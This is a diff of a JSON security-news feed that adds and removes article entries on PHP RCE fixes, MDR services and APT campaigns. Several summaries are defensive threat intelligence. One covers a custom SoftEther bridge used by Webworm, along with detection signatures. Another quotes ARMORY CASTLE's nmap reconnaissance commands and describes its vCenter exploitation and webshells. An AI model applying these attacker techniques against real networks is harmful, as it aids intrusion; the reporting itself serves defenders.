@@ -1,8 +1,8 @@
 {
   "version": "cyberheatradar2-overview-v2-reconstructed",
-  "generated_at": "2026-11-19T16:07:32.506980+00:00",
-  "as_of": "2026-11-19T16:00:00+00:00",
-  "catalog_count": 25839,
+  "generated_at": "2026-11-19T17:07:46.889827+00:00",
+  "as_of": "2026-11-19T17:00:00+00:00",
+  "catalog_count": 25852,
   "definitions": {
     "latest": "Publishedの新しい順。Published同値はFirst Seenの新しい順。",
     "hottest": "直近30日Publishedの記事を現在Heatの高い順。",
@@ -10,6 +10,179 @@
     "persistent_hot": "Heat履歴3点以上・48時間以上のspanが揃った記事を対象に、各時点で上位10%を80%以上維持した記事。"
   },
   "latest": [
+    {
+      "ai_relevance": "none",
+      "canonical_url": "https://www.bleepingcomputer.com/news/security/php-security-updates-fix-18-flaws-including-critical-rce-bugs/",
+      "cves": [],
+      "document_form": "single_story",
+      "first_seen_at": "2026-11-20T01:52:07.061050+09:00",
+      "heat_score": 65.0,
+      "permalink_id": "article-url-8e443c2964ac625708f2e93b",
+      "primary_category": "vulnerability",
+      "public_article_id": "url:8e443c2964ac625708f2e93b",
+      "public_tags": [
+        {
+          "color_family": "neutral",
+          "key": "vulnerability",
+          "label": "Vulnerability"
+        }
+      ],
+      "published_at": "2026-11-20T01:28:23+09:00",
+      "published_at_future_suppressed": false,
+      "security_relevance": "primary",
+      "seen_in_kev": false,
+      "source_class": "topic_rss",
+      "source_name": "BleepingComputer",
+      "summary": "The PHP development team released security updates addressing 18 vulnerabilities, including critical flaws that could allow unauthenticated attackers to remotely execute code on vulnerable servers. [...]",
+      "summary_excerpt": "The PHP development team released security updates addressing 18 vulnerabilities, including critical flaws that could allow unauthenticated attackers to remotely execute code on vulnerable servers. [...]",
+      "threat_actors": [],
+      "title": "PHP security updates fix 18 flaws, including critical RCE bugs"
+    },
+    {
+      "ai_relevance": "material",
+      "canonical_url": "https://www.rapid7.com/blog/post/dr-what-is-preemptive-mdr-security-leaders-guide/",
+      "cves": [],
+      "document_form": "single_story",
+      "first_seen_at": "2026-11-20T01:38:17.420770+09:00",
+      "heat_score": 45.0,
+      "permalink_id": "article-url-f2838a20598c1398806d59e8",
+      "primary_category": "ai_security",
+      "public_article_id": "url:f2838a20598c1398806d59e8",
+      "public_tags": [
+        {
+          "color_family": "cyan",
+          "key": "ai_security",
+          "label": "AI Security"
+        },
+        {
+          "color_family": "cyan",
+          "key": "agentic_security",
+          "label": "Agentic Security"
+        }
+      ],
+      "published_at": "2026-11-20T00:58:53+09:00",
+      "published_at_future_suppressed": false,
+      "security_relevance": "material",
+      "seen_in_kev": false,
+      "source_class": "topic_rss",
+      "source_name": "Rapid7 Blog",
+      "summary": "When an MDR provider contains a compromised endpoint, your team needs to know whether the weakness that enabled the attack exists elsewhere and who is responsible for addressing it. Without that follow-through, the immediate incident may be resolved while another attacker still has a way in. Preemptive managed detection and response (MDR) is Rapid7's approach to connecting exposure context, threat intelligence, AI-assisted investigation, and human expertise. It supports proactive cybersecurity by helping teams prioritize weaknesses before exploitation, investigate threats with a clearer understanding of risk, and use their findings to strengthen defenses. How does preemptive MDR differ from traditional MDR? Managed detection and response provides security specialists who monitor, investigate, and respond to threats around the clock. Many services also include proactive threat hunting and recommendations to improve security. Preemptive MDR connects that work more directly to what makes an organization vulnerable. When analysts investigate suspicious activity on a server, knowing that it is internet-facing, supports a critical application, and has a vulnerability under active exploitation helps them assess urgency and determine where to look next. In Rapid7’s model, exposure findings inform investigation and remediation priorities, while investigations reveal weaknesses that need attention. Security leaders gain a clearer connection between the threats their provider handles and the conditions their organization needs to address. Within a broader preemptive cybersecurity strategy, MDR connects exposure information with the people investigating and responding to threats. The aim is to reduce opportunities for compromise and intervene before an attack causes harm, while retaining the expertise to contain and recover from incidents. How exposure context and proactive threat hunting inform MDR By combining information about assets, vulnerabilities, business criticality, and attacker behavior, preemptive MDR helps teams decide which weaknesses require action first. Exposure context also informs targeted hunting and the investigation of suspicious activity. Consider a hypothetical organization running an internet-facing application affected by a newly disclosed vulnerability. The security team needs to establish whether the vulnerable software is present, what the application supports, and whether attackers are exploiting the weakness. Those findings can guide remediation priorities and targeted hunting for signs of compromise. If suspicious activity appears, analysts investigate it with an understanding of the affected system and the potential route an attacker could take through the environment. Depending on the evidence, the response may involve containing a system, examining related accounts, or expanding the investigation to other assets. The organization’s remediation teams also need clear recommendations about the underlying exposure. What the investigation reveals then feeds back into detection rules, hunting priorities, and response procedures. This gives leaders a way to track an identified risk through investigation, action, and outstanding work, with clearer ownership at each stage. What role does AI play in preemptive MDR? Before analysts can assess a potential threat, they often need to retrieve logs, examine user activity, and connect evidence across several systems. AI can accelerate this work by gathering and correlating information for review. Agentic investigation capabilities can perform elements of that process in parallel, test possible explanations, and organize findings. Their usefulness depends on the available data: missing identity activity or asset information can leave gaps in the account of what happened. Rapid7’s approach keeps human expertise central to validation and response decisions. Analysts assess the evidence alongside the organization’s priorities and the consequences of an action, including whether isolating a system could interrupt a critical service. What to look for in a preemptive MDR provider When evaluating a service described as preemptive, ask the provider to show how exposure information changes its work. A redacted investigation should make clear what analysts knew about the affected asset, how that influenced their reasoning, and which actions followed.If an investigation identified a weakness, was it assigned to an owner and addressed? Did the findings change detection coverage or future priorities? Where AI contributed, the provider should explain its role and the oversight applied. Incident response remains part of the requirement. Rapid7 MDR includes unlimited incident response alongside exposure-informed defense and AI-assisted investigation, supporting containment, detailed analysis, and threat eradication. Agree on responsibilities before that support is needed. Establish which actions the provider can take, when customer approval is required, and who owns remediation. Those arrangements determine how findings become action, particularly when taking a system offline carries business consequences. Once the service is operating, review progress through specific cases: exposures addressed before exploitation, threats contained, and weaknesses closed after investigation. Ask to see the evidence behind those outcomes and any work still outstanding, so your team can judge where risk has changed and where further attention is needed. Explore Rapid7 MDR to see how exposure-informed defense, AI-assisted investigation, and expert response work together.",
+      "summary_excerpt": "When an MDR provider contains a compromised endpoint, your team needs to know whether the weakness that enabled the attack exists elsewhere and who is responsible for addressing it. Without that follow-through, the immediate incident may be resolved while another attacker still has a way in. Preemptive managed detection and response (MDR) is Rapid7's approach to connecting exposure context, threat intelligence, AI-assisted investigation, and human expertise. It supports proactive cybersecurity by helping teams prioritize weaknesses before exploitation, investigate threats with a clearer unders",
+      "threat_actors": [],
+      "title": "What Is Preemptive MDR? A Guide For Security Leaders"
+    },
+    {
+      "ai_relevance": "none",
+      "canonical_url": "https://www.securityweek.com/php-patches-seven-critical-rce-vulnerabilities/",
+      "cves": [],
+      "document_form": "single_story",
+      "first_seen_at": "2026-11-20T01:22:50.756907+09:00",
+      "heat_score": 65.0,
+      "permalink_id": "article-url-e60ac72e5cb03181a5fdf86e",
+      "primary_category": "vulnerability",
+      "public_article_id": "url:e60ac72e5cb03181a5fdf86e",
+      "public_tags": [
+        {
+          "color_family": "neutral",
+          "key": "vulnerability",
+          "label": "Vulnerability"
+        }
+      ],
+      "published_at": "2026-11-20T00:54:20+09:00",
+      "published_at_future_suppressed": false,
+      "security_relevance": "primary",
+      "seen_in_kev": false,
+      "source_class": "topic_rss",
+      "source_name": "SecurityWeek",
+      "summary": "Successful exploitation could allow attackers to crash the worker process and execute code with the PHP worker’s privileges. The post PHP Patches Seven Critical RCE Vulnerabilities appeared first on SecurityWeek .",
+      "summary_excerpt": "Successful exploitation could allow attackers to crash the worker process and execute code with the PHP worker’s privileges. The post PHP Patches Seven Critical RCE Vulnerabilities appeared first on SecurityWeek .",
+      "threat_actors": [],
+      "title": "PHP Patches Seven Critical RCE Vulnerabilities"
+    },
+    {
+      "ai_relevance": "material",
+      "canonical_url": "https://www.cybersecuritydive.com/news/technology-outages-cyberattacks-ai-house-hearing/875148/",
+      "cves": [],
+      "document_form": "single_story",
+      "first_seen_at": "2026-11-20T01:22:39.473745+09:00",
+      "heat_score": 45.0,
+      "permalink_id": "article-url-cadbf6c827be79103f3578b0",
+      "primary_category": "other",
+      "public_article_id": "url:cadbf6c827be79103f3578b0",
+      "public_tags": [
+        {
+          "color_family": "cyan",
+          "key": "ai",
+          "label": "AI Security"
+        }
+      ],
+      "published_at": "2026-11-20T00:50:41+09:00",
+      "published_at_future_suppressed": false,
+      "security_relevance": "material",
+      "seen_in_kev": false,
+      "source_class": "topic_rss",
+      "source_name": "Cybersecurity Dive",
+      "summary": "As AI keeps finding serious software vulnerabilities, businesses will struggle to upgrade aging computer systems that weren’t designed for the modern threat landscape.",
+      "summary_excerpt": "As AI keeps finding serious software vulnerabilities, businesses will struggle to upgrade aging computer systems that weren’t designed for the modern threat landscape.",
+      "threat_actors": [],
+      "title": "‘What the hell is going on?’: Technology outages offer preview of US infrastructure’s messy, risky future"
+    },
+    {
+      "ai_relevance": "none",
+      "canonical_url": "https://www.infosecurity-magazine.com/news/ups-software-abused-domain/",
+      "cves": [],
+      "document_form": "single_story",
+      "first_seen_at": "2026-11-20T01:22:44.658607+09:00",
+      "heat_score": 65.0,
+      "permalink_id": "article-url-c9c549b275067ad9a83991fd",
+      "primary_category": "threat_campaign",
+      "public_article_id": "url:c9c549b275067ad9a83991fd",
+      "public_tags": [
+        {
+          "color_family": "red",
+          "key": "threat_campaign",
+          "label": "Campaign"
+        }
+      ],
+      "published_at": "2026-11-20T00:30:00+09:00",
+      "published_at_future_suppressed": false,
+      "security_relevance": "primary",
+      "seen_in_kev": false,
+      "source_class": "topic_rss",
+      "source_name": "Infosecurity Magazine",
+      "summary": "Symantec found an attacker using CyberPower’s UPS software to run scripts on a domain controller",
+      "summary_excerpt": "Symantec found an attacker using CyberPower’s UPS software to run scripts on a domain controller",
+      "threat_actors": [],
+      "title": "CyberPower PowerPanel Exploited to Run Malicious Code on Domain Controller"
+    },
+    {
+      "ai_relevance": "none",
+      "canonical_url": "https://www.infosecurity-magazine.com/news/php-releases-patches-fix-18/",
+      "cves": [],
+      "document_form": "single_story",
+      "first_seen_at": "2026-11-20T01:22:45.136684+09:00",
+      "heat_score": 65.0,
+      "permalink_id": "article-url-21d1b69b7e1197136b1cf5de",
+      "primary_category": "vulnerability",
+      "public_article_id": "url:21d1b69b7e1197136b1cf5de",
+      "public_tags": [
+        {
+          "color_family": "neutral",
+          "key": "vulnerability",
+          "label": "Vulnerability"
+        }
+      ],
+      "published_at": "2026-11-20T00:28:00+09:00",
+      "published_at_future_suppressed": false,
+      "security_relevance": "primary",
+      "seen_in_kev": false,
+      "source_class": "topic_rss",
+      "source_name": "Infosecurity Magazine",
+      "summary": "PHP has released security updates addressing 18 vulnerabilities, including critical remote code execution flaws affecting session handling",
+      "summary_excerpt": "PHP has released security updates addressing 18 vulnerabilities, including critical remote code execution flaws affecting session handling",
+      "threat_actors": [],
+      "title": "PHP Releases Patches to Fix 18 Vulnerabilities"
+    },
     {
       "ai_relevance": "primary",
       "canonical_url": "https://therecord.media/european-commission-confirms-cyberattack-using-ai",
@@ -42,6 +215,39 @@
       "summary_excerpt": "POLITICO had reported CERT-EU had identified the attackers’ use of ARTEX, an open-source AI hacking platform that the FBI last week warned was being used both by criminals and state-sponsored groups.",
       "threat_actors": [],
       "title": "European Commission confirms cyberattack, says hackers used AI tool"
+    },
+    {
+      "ai_relevance": "none",
+      "canonical_url": "https://www.rapid7.com/blog/post/tr-spying-on-governments-no-malware-custom-webworms-toolkit-softether-bridge/",
+      "cves": [],
+      "document_form": "single_story",
+      "first_seen_at": "2026-11-20T01:38:18.405033+09:00",
+      "heat_score": 65.0,
+      "permalink_id": "article-url-25e44f4fe671011a1533472f",
+      "primary_category": "threat_campaign",
+      "public_article_id": "url:25e44f4fe671011a1533472f",
+      "public_tags": [
+        {
+          "color_family": "red",
+          "key": "threat_campaign",
+          "label": "Campaign"
+        },
+        {
+          "color_family": "red",
+          "key": "malware",
+          "label": "Malware"
+        }
+      ],
+      "published_at": "2026-11-20T00:05:34+09:00",
+      "published_at_future_suppressed": false,
+      "security_relevance": "primary",
+      "seen_in_kev": false,
+      "source_class": "topic_rss",
+      "source_name": "Rapid7 Blog",
+      "summary": "Introduction For a threat actor, the perfect malware is one they don’t have to write, and already does all they need. One example of this is shown by the China-aligned APT known as Webworm, which has been known to deploy the open-source SoftEther VPN into the networks of compromised governmental organizations to maintain low-profile, long-term access. After this was publicly documented and defenders could keep an eye out for this tactic, the actor presumably started thinking of ways to make their covert access stealthier. In this post, we share our analysis of what we believe to be a so-far unknown custom SoftEther-based tool, which implements various tricks to hide itself from security tools, and which we attribute to Webworm with moderate confidence. We additionally provide guidance and tooling for detecting its presence on a system and extracting the configuration(s) associated with it. Technical analysis To illustrate how the tool works, we will use the only public sample of this tool we are aware of, which can be found in our IoCs list ( 90e7… ). The sample is a Windows PE32+ file targeting the x64 architecture. Based on cleartext strings and constants in the binary, we identified it as a (modified) build of the SoftEther VPN Bridge executable, specifically version 4.44, build 9807. Similarly, the PDB path included in the executable reads C:\\Users\\Administrator\\Desktop\\SoftEtherVPN_Stable\\SoftEtherVPN_Stable\\SoftEtherVPN_Stable\\src\\DebugFiles\\pdb\\x64_Release\\vpnbridge.pdb . As such, the tool doesn’t hide its identity from reverse engineers, only external interactions. The first and most trivial change the threat actor implements is in the PE metadata. Here we learn that the OriginalFileName of this binary is netcapa.exe , and it brands itself as “Network Monitor Software” published by a company named “Network Systems Solutions Inc.“. The only field unchanged against the stock SoftEther executable ( vpnbridge_x64.exe ) is the Version , which reads 4, 44, 0, 9807 . Next, we wanted to identify any functionality added or modified by the threat actor. The SoftEther bridge alone is a powerful tool to maintain remote access to a compromised network, but we wanted to know if perhaps there was a backdoor to give the threat actor direct command execution on the infected host. For that reason we checked out the corresponding tag in the public “SoftEtherVPN_Stable” repository on GitHub and compared it to the decompiled sample. Internal rebranding The rebranding apparent in the exposed metadata extends into internal strings used in debug banners, service names, registry keys, the contents of the server’s HTTP 401 error page, or firewall rule names, where occurrences of “SoftEther VPN” are replaced by “NtMonitor VPN”. However, the renaming is inconsistent; for example, the service name used by the entry point is still SEVPNBRIDGE , and many registry key paths still reference the “SoftEther Project”. Network stealth Stock SoftEther VPN Mayaqua/Network.h defines HTTP endpoints used by the protocol: HTTP_VPN_TARGET \"/vpnsvc/vpn.cgi\" HTTP_VPN_TARGET2 \"/vpnsvc/connect.cgi\" NtMonitor replaces these endpoints with much more innocent-sounding names, in particular: HTTP_VPN_TARGET \"/update/alive.cgi\" HTTP_VPN_TARGET2 \"/update/picture.cgi\" A client initiating a connection to a SoftEther VPN server will send a handshake request to HTTP_VPN_TARGET2 along with a \"watermark\", i.e. a byte pattern proving that the client is speaking the correct VPN protocol. Otherwise, the server answers with a decoy HTTP response. NtMonitor changes the upstream GIF watermark with a custom byte pattern (a truncated PNG file showing the Windows logo), so that stock SoftEther clients and servers cannot handshake with this build, and NtMonitor's own peers cannot be fingerprinted with the well-known stock GIF watermark. Embedded resource archive As the threat actor probably realizes, a SoftEther resource archive named hamcore.se2, which sits next to the executables in the installation directory and is required to be present at runtime, provides a straightforward detection opportunity for unauthorized installations. We think that, for this exact reason, the actor chose to reduce the contents of this archive to a bare minimum, package the archive inside the bridge executable itself (as a PE resource), and implement a custom resource directory walk to load the archive at runtime. As a side effect, this increases the binary’s size by about 1.5 MB compared to the official build. Encrypted configuration Another weak point (for the attacker) in stock SoftEther is that its configuration is stored on disk in plain text in a well-recognizable format. The actor changes its name from vpn_bridge.config to setting.conf and modifies the configuration loader to handle custom-encrypted files that start with the magic bytes RCEN in ASCII. The rest of the encrypted file has a simple format and includes the encryption key. A Python script to decrypt such files with the actor’s custom RC4-like cipher is available on the Rapid7 Intelligence GitHub repository. Attribution and interpretation of findings Beyond the changes described above, we did not identify any additional malware functionality. Clearly, the threat actor prioritizes stealth above raw capability. It seems like they methodically analyzed SoftEther’s detection surface and implemented counter-measures to all of the easy ways a detection engineer may target it. At the time of our analysis, only one anti-virus vendor detected the sample on VirusTotal, although it has been public since January. This aligns well with the TTPs previously reported for Webworm by ESET, and such attribution is further supported by indicators in decrypted configurations Rapid7 Intelligence has access to. In all of the cases, the VPN is configured to bridge (“cascade”) a remote network into the local one; furthermore, in cases that were not likely deliberate tests, the remote IP address was located inside AS 20473 belonging to The Constant Company, LLC, which (also including its subsidiary, Vultr) has been associated with Webworm on many occasions in the past. Considering this attribution, we can put together some important takeaways: Quite likely, we are looking at a new evolution in the tooling used by Webworm, a China-aligned APT whose activity is known to focus on governmental organizations, especially in Europe. Earlier this year, ESET already noted this group to shift away from custom malware to dual-use tools such as SoftEther VPN, but now we are observing a sort of hybrid of the two — stock SoftEther software that is not trojanized , but rebuilt from source in a way that erases much of its detection fingerprint. Detection guidance To detect this particular variant of Webworm’s tooling, we provide a list of IoCs and a YARA ruleset on our public GitHub repository. If you have the ability to inspect TLS traffic in your organization, one of the most reliable detections you can deploy right now is to look for POST requests to /update/picture.cgi with Content-Type: image/jpeg and a request body starting with and 89 50 4e 47 0d 0a 1a 0a 00 00 00 0d 49 48 44 52 (initial bytes of the custom PNG watermark). Although the samples we have seen all use the same NtMonitor branding internally (despite the PE metadata differing across samples), this is the easiest change for the threat actor to implement next. Similarly, the HTTP endpoints and watermark can be swapped out trivially. As such, we recommend defenders in the government sector to familiarize themselves with intrinsic SoftEther VPN behavior in order to stay one step ahead of when the threat actor decides to update the tool next. MITRE ATT&CK techniques Technique ID Technique Name Comment T1587.001 Develop Capabilities: Malware The actor is maintaining their own fork of SoftEther VPN used for malicious purposes. T1027.013 Obfuscated Files or Information: Encrypted/Encoded File Configuration files are encrypted with a custom cipher. T1140 Deobfuscate/Decode Files or Information Encrypted configuration files are decrypted at startup by the modified loader. T1036.005 Masquerading: Match Legitimate Resource Name or Location PE metadata is purposefully changed to masquerade as a generic system service. T1027.005 Obfuscated Files or Information: Indicator Removal from Tools Known SoftEther artifacts are systematically removed from the binary. T1686.003 Disable or Modify System Firewall: Windows Host Firewall Using stock SoftEther functionality, the malware adds rules to the system firewall. T1599 Network Boundary Bridging The VPN bridge binds together the infected host’s local area network with the attacker’s. T1071 Application Layer Protocol C2 communication uses HTTP(S) and SoftEther’s application protocol. T1090.001 Proxy: Internal Proxy The infected host serves as an internal proxy mediating C2 access to other hosts on the network.",
+      "summary_excerpt": "Introduction For a threat actor, the perfect malware is one they don’t have to write, and already does all they need. One example of this is shown by the China-aligned APT known as Webworm, which has been known to deploy the open-source SoftEther VPN into the networks of compromised governmental organizations to maintain low-profile, long-term access. After this was publicly documented and defenders could keep an eye out for this tactic, the actor presumably started thinking of ways to make their covert access stealthier. In this post, we share our analysis of what we believe to be a so-far un",
+      "threat_actors": [],
+      "title": "Spying on Governments with Zero Lines of Malware: A Custom SoftEther Bridge in Webworm’s Toolkit"
     },
     {
       "ai_relevance": "none",
@@ -98,202 +304,6 @@
       "summary_excerpt": "Two critical NGINX vulnerabilities dubbed \"nginx2root\" allow unauthenticated attackers to execute code remotely on vulnerable web servers, with researchers demonstrating how the flaws can be chained with a Linux kernel bug to gain root access. [...]",
       "threat_actors": [],
       "title": "Critical NGINX ‘NGINX2Root’ bugs let attackers hijack servers"
-    },
-    {
-      "ai_relevance": "none",
-      "canonical_url": "https://www.security-next.com/193112",
-      "cves": [],
-      "document_form": "single_story",
-      "first_seen_at": "2026-11-20T00:24:07.255876+09:00",
-      "heat_score": 65.0,
-      "permalink_id": "article-url-8774cd16be693761bc2b2d85",
-      "primary_category": "other",
-      "public_article_id": "url:8774cd16be693761bc2b2d85",
-      "public_tags": [],
-      "published_at": "2026-11-19T23:54:38+09:00",
-      "published_at_future_suppressed": false,
-      "security_relevance": "primary",
-      "seen_in_kev": false,
-      "source_class": "topic_rss",
-      "source_name": "Security NEXT",
-      "summary": "Javaの開発、実行環境「OpenJDK」に、任意のコード実行やメモリ内の情報窃取につながるおそれがある脆弱性が判明した。「Java4Shell」とも呼ばれており、開発チームはアップデートをリリース。「Oracle」などアップデートを実施している。",
-      "summary_excerpt": "Javaの開発、実行環境「OpenJDK」に、任意のコード実行やメモリ内の情報窃取につながるおそれがある脆弱性が判明した。「Java4Shell」とも呼ばれており、開発チームはアップデートをリリース。「Oracle」などアップデートを実施している。",
-      "threat_actors": [],
-      "title": "「OpenJDK」に脆弱性、PoCも - 修正版が公開"
-    },
-    {
-      "ai_relevance": "none",
-      "canonical_url": "https://thehackernews.com/2026/11/php-fixes-7-critical-flaws-including.html",
-      "cves": [
-        "CVE-2026-115560"
-      ],
-      "document_form": "single_story",
-      "first_seen_at": "2026-11-20T00:24:08.482431+09:00",
-      "heat_score": 75.0,
-      "permalink_id": "article-url-dcfa8134ceac9ad36d391ec7",
-      "primary_category": "vulnerability",
-      "public_article_id": "url:dcfa8134ceac9ad36d391ec7",
-      "public_tags": [
-        {
-          "color_family": "neutral",
-          "key": "vulnerability",
-          "label": "Vulnerability"
-        }
-      ],
-      "published_at": "2026-11-19T23:45:06+09:00",
-      "published_at_future_suppressed": false,
-      "security_relevance": "primary",
-      "seen_in_kev": false,
-      "source_class": "topic_rss",
-      "source_name": "The Hacker News",
-      "summary": "The PHP Foundation has released security updates to address multiple critical security flaws that could be exploited to achieve remote code execution on affected deployments, including CVE-2026-115560. The list of vulnerabilities is as follows - CVE-2026-115560 (CVSS score: 9.2) - An improper input validation vulnerability that could result in remote code execution, file modification,",
-      "summary_excerpt": "The PHP Foundation has released security updates to address multiple critical security flaws that could be exploited to achieve remote code execution on affected deployments, including CVE-2026-115560. The list of vulnerabilities is as follows - CVE-2026-115560 (CVSS score: 9.2) - An improper input validation vulnerability that could result in remote code execution, file modification,",
-      "threat_actors": [],
-      "title": "PHP Fixes 7 Critical Flaws, Including Bugs That Could Allow Remote Code Execution"
-    },
-    {
-      "ai_relevance": "primary",
-      "canonical_url": "https://www.infosecurity-magazine.com/news/commission-ai-attack-systems/",
-      "cves": [],
-      "document_form": "single_story",
-      "first_seen_at": "2026-11-20T00:23:55.395770+09:00",
-      "heat_score": 65.0,
-      "permalink_id": "article-url-60421590ddab06b282f12407",
-      "primary_category": "ai_security",
-      "public_article_id": "url:60421590ddab06b282f12407",
-      "public_tags": [
-        {
-          "color_family": "cyan",
-          "key": "ai_security",
-          "label": "AI Security"
-        }
-      ],
-      "published_at": "2026-11-19T23:45:00+09:00",
-      "published_at_future_suppressed": false,
-      "security_relevance": "primary",
-      "seen_in_kev": false,
-      "source_class": "topic_rss",
-      "source_name": "Infosecurity Magazine",
-      "summary": "The European Commission said the attack targeted “individual systems”, with reports that attackers leveraged ARTEX in the campaign",
-      "summary_excerpt": "The European Commission said the attack targeted “individual systems”, with reports that attackers leveraged ARTEX in the campaign",
-      "threat_actors": [],
-      "title": "European Commission Confirms AI-Driven Cyber-Attack Took Systems Offline"
-    },
-    {
-      "ai_relevance": "none",
-      "canonical_url": "https://thehackernews.com/2026/11/drupal-patches-critical-installer-flaw.html",
-      "cves": [],
-      "document_form": "single_story",
-      "first_seen_at": "2026-11-20T00:24:08.588185+09:00",
-      "heat_score": 45.0,
-      "permalink_id": "article-url-88c544823e0d1532883cb2e9",
-      "primary_category": "vulnerability",
-      "public_article_id": "url:88c544823e0d1532883cb2e9",
-      "public_tags": [
-        {
-          "color_family": "neutral",
-          "key": "vulnerability",
-          "label": "Vulnerability"
-        }
-      ],
-      "published_at": "2026-11-19T23:33:06+09:00",
-      "published_at_future_suppressed": false,
-      "security_relevance": "material",
-      "seen_in_kev": false,
-      "source_class": "topic_rss",
-      "source_name": "The Hacker News",
-      "summary": "Under specific conditions, a critical vulnerability in Drupal core can allow an attacker without login credentials to use the built-in installer to attempt to reinstall a site. That can lead to a site takeover or remote code execution, and the project rates the vulnerable configurations as uncommon. Fixed releases for all supported branches shipped yesterday. The Drupal Security Team disclosed",
-      "summary_excerpt": "Under specific conditions, a critical vulnerability in Drupal core can allow an attacker without login credentials to use the built-in installer to attempt to reinstall a site. That can lead to a site takeover or remote code execution, and the project rates the vulnerable configurations as uncommon. Fixed releases for all supported branches shipped yesterday. The Drupal Security Team disclosed",
-      "threat_actors": [],
-      "title": "Drupal Patches Critical Installer Flaw That Could Give Unauthenticated Attackers Control of Sites"
-    },
-    {
-      "ai_relevance": "none",
-      "canonical_url": "https://www.securityweek.com/nvidia-responds-to-gentlemen-ransomware-claim/",
-      "cves": [],
-      "document_form": "single_story",
-      "first_seen_at": "2026-11-19T23:22:43.175352+09:00",
-      "heat_score": 65.0,
-      "permalink_id": "article-url-99484983430e63d2a03ce22c",
-      "primary_category": "ransomware",
-      "public_article_id": "url:99484983430e63d2a03ce22c",
-      "public_tags": [
-        {
-          "color_family": "red",
-          "key": "ransomware",
-          "label": "Ransomware"
-        }
-      ],
-      "published_at": "2026-11-19T23:17:32+09:00",
-      "published_at_future_suppressed": false,
-      "security_relevance": "primary",
-      "seen_in_kev": false,
-      "source_class": "topic_rss",
-      "source_name": "SecurityWeek",
-      "summary": "Nvidia says it has found no indication that its systems were compromised after the Gentlemen ransomware group listed the company as a victim. The post Nvidia Responds to Gentlemen Ransomware Claim appeared first on SecurityWeek .",
-      "summary_excerpt": "Nvidia says it has found no indication that its systems were compromised after the Gentlemen ransomware group listed the company as a victim. The post Nvidia Responds to Gentlemen Ransomware Claim appeared first on SecurityWeek .",
-      "threat_actors": [],
-      "title": "Nvidia Responds to Gentlemen Ransomware Claim"
-    },
-    {
-      "ai_relevance": "none",
-      "canonical_url": "https://cloud.google.com/blog/topics/threat-intelligence/armory-castle-exploits-vsphere",
-      "cves": [
-        "CVE-2025-22457",
-        "CVE-2026-102764",
-        "CVE-2026-123890",
-        "CVE-2026-59309"
-      ],
-      "document_form": "single_story",
-      "first_seen_at": "2026-11-20T00:23:46.666750+09:00",
-      "heat_score": 75.0,
-      "permalink_id": "article-url-f0a72729ec5cbd872c90bc4b",
-      "primary_category": "vulnerability",
-      "public_article_id": "url:f0a72729ec5cbd872c90bc4b",
-      "public_tags": [
-        {
-          "color_family": "neutral",
-          "key": "vulnerability",
-          "label": "Vulnerability"
-        },
-        {
-          "color_family": "red",
-          "key": "malware",
-          "label": "Malware"
-        }
-      ],
-      "published_at": "2026-11-19T23:00:00+09:00",
-      "published_at_future_suppressed": false,
-      "security_relevance": "primary",
-      "seen_in_kev": false,
-      "source_class": "topic_rss",
-      "source_name": "Google Cloud / Mandiant Threat Intelligence",
-      "summary": "Written by: Jayson Frost, Bryce Greathouse, Dhanesh Kizhakkinan, John Palmisano, Steve Rasch, Daniel Sislo, John Wolfram Introduction On Oct. 15, 2026, Mandiant and Google Threat Intelligence Group (GTIG) published a blog post detailing recent activity in which the suspected PRC-nexus threat actor ARMORY CASTLE (formerly tracked as UNC5221) exploited CVE-2026-102764, a zero-day vulnerability in BeyondTrust Remote Support, which was patched in BT26-05 . We also described some of the threat actor’s post-exploitation operations. In this blog we describe additional post-compromise activity involving the exploitation of a vulnerability in VMware vCenter and the deployment of additional malware families. On Nov. 19, 2026, VMware disclosed CVE-2026-123890, which impacts VMware vCenter Server deployments. vSphere consists of both ESXi (the hypervisor) and vCenter Server. The vCenter server is a centralized platform deployed as a Photon Linux virtual appliance and is used to configure, control, and monitor ESXi host environments. CVE-2026-123890 is an unauthenticated Secure Remote Password (SRP-6a) session key disclosure vulnerability over Distributed Computing Environment/Remote Procedure Calls (DCE/RPC). Successful exploitation results in a remote authentication bypass which creates an authenticated session established as administrator@vsphere.local . Using the authenticated administrator session, the attacker can execute arbitrary commands and acquire files, including the data.mdb database, by leveraging the vCenter Server Directory Service ( vmdird ) RPC interface vmdirdbcp . We strongly recommend that affected organizations immediately apply the security patches provided by Broadcom to remediate the vulnerability. ARMORY CASTLE exploited this vulnerability in early September 2026 using BONESAW, according to forensic evidence. BONESAW is a utility primarily built to facilitate remote exploitation written in Golang , which utilizes CVE-2026-123890 to exfiltrate the arbitrary Lightning Memory-Mapped Database (LMDB), hijack the SAML Security Token Service (STS), and create a Single Sign On (SSO) Administrator account. ARMORY CASTLE’s use of BONESAW represents significant new insight into this threat actor’s post-exploitation tactics. In this campaign, ARMORY CASTLE exploited two zero-days, and deployed three sets of malware specifically tailored for operating on targeted devices, indicating deep platform expertise and substantial resource backing. We are publishing this analysis, along with mitigation and hardening guidance, to support defenders in detecting this threat. Threat Detail Moving laterally from the Remote SupportRemote Support device, ARMORY CASTLE established a foothold on an internal Linux appliance, escalated privileges to root, and staged a suite of malware to support expanding access, persistence, and targeting of vCenter. ARMORY CASTLE exploited a zero-day vulnerability to gain access to the VMware server, and likely used an additional set of malware customized to this environment to conduct reconnaissance, credential theft, and data theft. Figure 1: ARMORY CASTLE lateral movement and vCenter compromise sequence of events Move Laterally Following the establishment of persistence and the deployment of lateral movement capabilities on the Remote Support appliance, Mandiant observed ARMORY CASTLE conducting internal reconnaissance. This reconnaissance was heavily focused on VMware systems, based on the specific ports ARMORY CASTLE scanned and the URIs the group visited such as /sdk and /ui . The group leveraged nmap to scan the internal environment for systems running open ports specific to VMware, namely ports 9080, 5480, and 2012. Notably, port 2012 is used as the control interface RPC for vCenter Single Sign-On (SSO) and is an integral part of ARMORY CASTLE’s remote exploitation of CVE-2026-123890 through BONESAW. /usr/sbin/nmap -sS -p 443,2012,389 --open <REDACTED>.0/24 /usr/sbin/nmap -sS -p 443,2012,5480 --open <REDACTED>.0/24 /usr/sbin/nmap -sS -p 443,9080 --open <REDACTED>.0/24 /usr/sbin/nmap -sS -p 9080,2012 --open <REDACTED>.0/24 /usr/sbin/nmap -sS -p 443,2012,389,445,3389,22,21 --open <REDACTED>.0/24 Figure 2: ARMORY CASTLE nmap port scanning ARMORY CASTLE moved laterally to internal Linux appliances within the environment that lacked endpoint detection and response (EDR) tooling. ARMORY CASTLE deployed five newly identified malware families and utilities: the SLIMSAVAGE and CAGEMATCH webshells, the BEARBONES backdoor, the BONESAW remote exploitation utility, and the SAWSNAKE SAML utility. ARMORY CASTLE also deployed the LAZYBONES backdoor, 